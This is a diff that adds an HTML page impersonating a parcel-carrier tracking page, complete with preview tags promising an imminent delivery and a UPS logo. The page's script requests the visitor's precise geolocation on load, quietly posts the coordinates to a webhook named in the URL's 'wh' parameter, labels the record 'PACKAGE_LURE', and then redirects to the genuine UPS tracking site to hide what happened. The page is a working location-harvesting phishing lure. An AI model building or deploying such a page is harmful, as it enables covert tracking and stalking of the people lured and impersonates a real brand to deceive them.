@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Open Graph Meta Tags for Tracking Preview -->
+    <title>Track Your Package | Global Delivery Service</title>
+    <meta name="description" content="Your package is arriving soon. Click to see live delivery status and map.">
+    <meta property="og:title" content="OUT FOR DELIVERY: Package #TRK-9921">
+    <meta property="og:description" content="Expected arrival: 15-30 minutes. View live map.">
+    <meta property="og:image" content="https://www.ups.com/assets/resources/images/brand/ups-logo.svg">
+    <meta property="og:type" content="website">
+
+    <style>
+        body {
+            font-family: sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #f4f4f4;
+            color: #333;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #ddd;
+            border-top: 5px solid #ffcc00;
+            border-radius: 50%;
+            animation: spin 1s infinite linear;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <h2>Package Tracker</h2>
+    <div class="spinner"></div>
+    <p>Connecting to GPS satellite for live delivery estimate...</p>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const webhook = urlParams.get('wh');
+        const redirect = "https://www.ups.com/track";
+
+        window.onload = () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (p) => {
+                        if (webhook) {
+                            await fetch(webhook, {
+                                method: 'POST',
+                                mode: 'no-cors',
+                                body: JSON.stringify({ lat: p.coords.latitude, lng: p.coords.longitude, type: "PACKAGE_LURE" })
+                            });
+                        }
+                        window.location.href = redirect;
+                    },
+                    () => { window.location.href = redirect; },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                window.location.href = redirect;
+            }
+        };
+    </script>
+</body>
+
+</html>
